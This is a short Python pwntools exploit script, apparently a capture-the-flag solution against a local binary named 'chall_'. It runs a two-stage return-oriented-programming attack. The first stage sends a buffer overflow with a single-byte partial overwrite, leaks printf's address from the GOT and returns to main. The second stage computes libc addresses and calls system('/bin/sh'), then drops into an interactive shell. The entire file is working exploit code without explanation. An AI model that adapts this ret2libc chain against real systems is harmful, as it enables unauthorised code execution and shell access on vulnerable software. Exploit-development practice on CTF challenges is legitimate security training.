from pwn import *

p = process("./chall_")
elf = ELF("./chall_")
libc = ELF("libc-2.33.so")
raw_input("DEBUG")

pop_rdi = 0x0000000000401303
ret = 0x000000000040101a
log.info

p.recvuntil("Enter your name: ")

payload = b"A"*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(elf.got['printf'])
payload += p64(elf.sym['printf'])
payload += p64(elf.sym['main'])
payload += (232-len(payload))*b"A"

payload += b"\xfe"
	
p.send(payload)

recieved = p.recvuntil("Enter your name: ", drop = True)
leak = u64(recieved.ljust(8, b"\x00"))
libc1 = leak - libc.sym['printf']
log.info("Leaked libc address,  "+ hex(libc1))
bin_sh = libc1 + 0x198882


payload2 = b"A"*8
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(libc1 + libc.sym['system'])
payload2 += p64(libc1 +  libc.sym['exit'])
payload2 += (232-len(payload2))*b"A"

payload2 += b"\xfe"
p.send(payload2)

p.interactive()
